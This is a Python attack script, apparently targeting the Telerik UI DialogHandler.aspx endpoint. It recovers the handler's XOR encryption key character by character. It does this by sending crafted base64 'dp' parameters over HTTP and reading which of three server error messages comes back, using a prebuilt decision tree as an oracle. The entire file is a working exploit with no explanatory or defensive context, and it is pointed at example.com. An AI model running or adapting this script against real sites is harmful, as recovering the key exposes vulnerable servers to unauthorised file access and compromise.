import requests
import base64
import re
import string


class Node(object):
    def __init__(self):
        self.links = [None] * 3
        self.counter = 0
        self.key = None


class Tree(object):
    def __init__(self):
        self.root = Node()
    
    def add_data(self, array, key):
        node = self.root
        for value in array:
            node.counter += 1
            if node.links[value] == None:
                node.links[value] = Node()
            node = node.links[value]
        node.key = key


class Bruter(object):

    error_messages = [
        "The input is not a valid Base-64 string as it contains a non-base 64 character, more than two padding characters, or an illegal character among the padding characters.",
        "Invalid length for a Base-64 char array or string.",
        "Index was outside the bounds of the array."
    ]

    full_charset =  "".join(map(chr, range(256)))
    base64_charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    hex_upper_charset = "0123456789ABCDEF"
    hex_lower_charset = "0123456789abcdef"
    printable_charset = string.printable

    def __init__(self, target):
        self.target = target
        self.key_charset = self.hex_upper_charset   # Change this
        self.tree = Tree()
        self.build_tree()

    def transform(self, value):
        if value in [9, 10, 13, 32]: return 2
        if chr(value) in self.base64_charset: return 1
        return 0

    def build_tree(self):
        for key_char in self.key_charset:
            array = [self.transform(i^ord(key_char)) for i in range(256)]
            self.tree.add_data(array, key_char)

    def xor(self, data, key): 
        return bytearray(ord(a)^ord(b) for a, b in zip(data, key)).decode()

    def run(self):
        key = ""
        total = 0
        for _ in range(48):
            padleft = self.xor(" "*_, key)
            node = self.tree.root
            counter = 0
            for i in range(256):
                dp_encrypted = base64.b64encode((padleft + chr(i)).encode()).decode()
                url = self.target + "?dp=" + dp_encrypted
                r = requests.get(url)
                counter += 1
                match = re.search("(Error Message:)(.+\n*.+)(</div>)", r.text)
                value = self.error_messages.index(match.group(2).strip())
                node = node.links[value]
                if node.counter <= 1: break
            while not node.key:
                for next_node in node.links:
                    if next_node != None:
                        node = next_node
                        break
            key += node.key
            total += counter
            print('[+] Key position {:0>2d}: {} found with {} requests. Total : {}'.format(_+1, node.key, counter, total))


bruter = Bruter("http://example.com/Telerik.Web.UI.DialogHandler.aspx")
bruter.run()
